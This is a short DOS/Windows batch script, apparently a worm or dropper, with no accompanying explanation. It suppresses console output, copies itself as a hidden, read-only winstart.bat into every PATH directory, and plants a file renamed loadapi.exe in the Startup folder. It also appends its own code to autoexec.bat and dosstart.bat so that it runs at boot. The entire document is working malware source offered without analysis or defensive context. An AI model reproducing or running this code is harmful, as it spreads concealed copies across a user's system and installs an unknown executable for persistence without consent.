@ctty nul
for %%s in (%path%) do copy %0 %%s\winstart.bat
for %%s in (%path%) do attrib %%s\winstart.bat +r +h
copy %winbootdir%\msdll.dxl %winbootdir%\startm~1\programs\startup\loadapi.exe
find "loadapi.exe"<c:\autoexec.bat>>nul
if errorlevel 1 type %0>>c:\autoexec.bat
find "loadapi.exe"<%winbootdir%\dosstart.bat>>nul
if errorlevel 1 type %0>>%winbootdir%\dosstart.bat
@ctty con

